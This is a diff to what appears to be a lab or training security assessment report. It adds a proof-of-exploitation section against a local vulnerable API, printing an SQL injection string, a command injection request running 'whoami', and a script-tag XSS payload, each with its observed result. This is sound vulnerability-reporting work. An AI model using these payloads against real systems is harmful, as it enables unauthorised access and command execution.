@@ -73,7 +73,28 @@ I used the LPI sandbox tools during my analysis:
   → Provided insights into healthcare digital twin implementations and modeling.
 
 These helped me understand expected system behavior and compare it with the vulnerable API.
+## Proof of Exploitation
 
+### SQL Injection
+Request:
+http://127.0.0.1:5001/api/query?q=' OR 1=1 --
+
+Observation:
+Application throws SQL error, confirming unsanitized input handling.
+
+### Command Injection
+Request:
+http://127.0.0.1:5001/api/run?cmd=whoami
+
+Output:
+Shows system username → confirms remote command execution.
+
+### XSS
+Request:
+http://127.0.0.1:5001/api/user/1?name=<script>alert(1)</script>
+
+Observation:
+Script executes in browser → confirms XSS vulnerability.
 ## Conclusion
 The API contains multiple critical vulnerabilities including injection attacks, exposed secrets, and missing authentication. Immediate fixes are required before deployment.
 <!-- level 3 final submission -->
